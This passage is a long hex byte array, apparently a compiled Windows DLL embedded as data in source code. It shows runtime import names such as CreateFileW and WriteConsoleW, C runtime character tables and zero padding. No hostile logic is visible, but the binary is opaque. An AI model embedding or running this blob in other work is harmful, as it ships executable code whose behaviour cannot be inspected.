0x74, 0x43, 0x50, 0x0, 0x0, 0xe, 0x2, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x4d, 0x6f, 0x64, 0x65, 0x0, 0x0, 0x49, 0x5, 0x53, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x50, 0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x45, 0x78, 0x0, 0x0, 0xd3, 0x0, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x57, 0x0, 0x8e, 0x0, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x0, 0x3c, 0x6, 0x57, 0x72, 0x69, 0x74, 0x65, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7, 0x26, 0xd8, 0x8e, 0xb8, 0x78, 0xf9, 0x78, 0x84, 0x3c, 0x0, 0xa8, 0x5b, 0xa, 0x6a, 0xe2, 0xc9, 0x6d, 0x63, 0x8b, 0x87, 0x9e, 0x80, 0xb5, 0x16, 0xc5, 0xa5, 0xc7, 0xda, 0x44, 0x1d, 0x2d, 0xae, 0x48, 0x2c, 0xb1, 0xc8, 0x92, 0xf5, 0xbc, 0xf5, 0xb8, 0xe6, 0xda, 0x9, 0x3c, 0x85, 0x9e, 0xac, 0xfa, 0x4c, 0xce, 0xa4, 0x35, 0x0, 0xdc, 0x50, 0x6b, 0x36, 0xb7, 0x5c, 0xfb, 0x12, 0xf1, 0x52, 0x46, 0x5b, 0x15, 0x3, 0x7d, 0x7b, 0x4e, 0x8d, 0x71, 0xf5, 0x7c, 0x43, 0x87, 0x46, 0x54, 0x64, 0xf9, 0x75, 0xab, 0x65, 0xb0, 0xbf, 0x9b, 0xc3, 0xd2, 0x3a, 0x73, 0xfc, 0xe3, 0x35, 0xe1, 0x23, 0x5d, 0x29, 0xe5, 0x10, 0xe2, 0x72, 0xef, 0xa9, 0x25, 0xa, 0x5a, 0x1f, 0x8e, 0xf7, 0xa5, 0xd8, 0x8b, 0x16, 0x33, 0xcf, 0x91, 0xde, 0x17, 0x79, 0x6, 0x5f, 0xd9, 0x61, 0x2c, 0x6a, 0x90, 0x7a, 0xaf, 0xb3, 0xdd, 0x1e, 0x0, 0xe3, 0xf3, 0x70, 0x5, 0x7a, 0x6d, 0x42, 0x7f, 0xb2, 0xc, 0xe0, 0xa2, 0xce, 0x3b, 0x1f, 0xa3, 0xf5, 0xcf, 0xa9, 0x1f, 0x3a, 0xf7, 0xab, 0x3, 0xf3, 0x36, 0xf2, 0x86, 0xf4, 0x4f, 0x20, 0x4a, 0xaa, 0x6a, 0x1c, 0xae, 0xe0, 0x13, 0x29, 0xe3, 0xb7, 0x84, 0xd8, 0x9b, 0xbc, 0x2f, 0xa6, 0xb2, 0x5f, 0xdc, 0x3b, 0x1, 0x70, 0x16, 0x61, 0x4c, 0xee, 0x42, 0x69, 0xf6, 0x1, 0x87, 0x76, 0x2f, 0x84, 0x14, 0x38, 0xd3, 0xa6, 0xe0, 0x25, 0x57, 0xa0, 0x7e, 0x4c, 0x1c, 0x6, 0xf, 0xae, 0x29, 0x92, 0x10, 0x3f, 0x5a, 0xff, 0x1d, 0x57, 0x67, 0x18, 0xba, 0x67, 0xb1, 0x7d, 0x9a, 0x6f, 0x48, 0xa3, 0x23, 0x23, 0x12, 0x62, 0xe3, 0x8b, 0xfb, 0x3e, 0x63, 0x9, 0xd0, 0x1d, 0xf8, 0xb0, 0xf6, 0x9c, 0x94, 0xd4, 0xb3, 0x2b, 0xfe, 0xe, 0xbb, 0x98, 0x65, 0xcf, 0x29, 0x39, 0xf8, 0x74, 0x3b, 0x9d, 0x24, 0xc2, 0xc, 0xa4, 0xdf, 0x7e, 0x4, 0xfd, 0xf9, 0x11, 0xc5, 0x36, 0xc6, 0xb5, 0x27, 0xd, 0x16, 0xa9, 0xe, 0xe3, 0x9, 0x65, 0xfb, 0xa5, 0xa3, 0xaf, 0x86, 0x80, 0xd4, 0x5e, 0xa3, 0xae, 0x79, 0xa9, 0x92, 0x38, 0xbe, 0x79, 0x8a, 0x9c, 0x41, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xcd, 0x5d, 0x20, 0xd2, 0x66, 0xd4, 0xff, 0xff, 0x32, 0xa2, 0xdf, 0x2d, 0x99, 0x2b, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x2f, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xc, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x2, 0x4, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0x3, 0x0, 0x0, 0x60, 0x82, 0x79, 0x82, 0x21, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa6, 0xdf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa1, 0xa5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0x9f, 0xe0, 0xfc, 0x0, 0x0, 0x0, 0x0, 0x40, 0x7e, 0x80, 0xfc, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x3, 0x0, 0x0, 0xc1, 0xa3, 0xda, 0xa3, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb5, 0x3, 0x0, 0x0, 0xc1, 0xa3, 0xda, 0xa3, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb6, 0x3, 0x0, 0x0, 0xcf, 0xa2, 0xe4, 0xa2, 0x1a, 0x0, 0xe5, 0xa2, 0xe8, 0xa2, 0x5b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x7e, 0xa1, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x51, 0x5, 0x0, 0x0, 0x51, 0xda, 0x5e, 0xda, 0x20, 0x0, 0x5f, 0xda, 0x6a, 0xda, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xd3, 0xd8, 0xde, 0xe0, 0xf9, 0x0, 0x0, 0x31, 0x7e, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x14, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x99, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x17, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf0, 0x18, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x70, 0xd, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x96, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x91, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x43, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x20, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x20, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfe, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x99, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0x7f, 0xec, 0x99, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2e, 0x0, 0x0, 0x0, 0x2e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 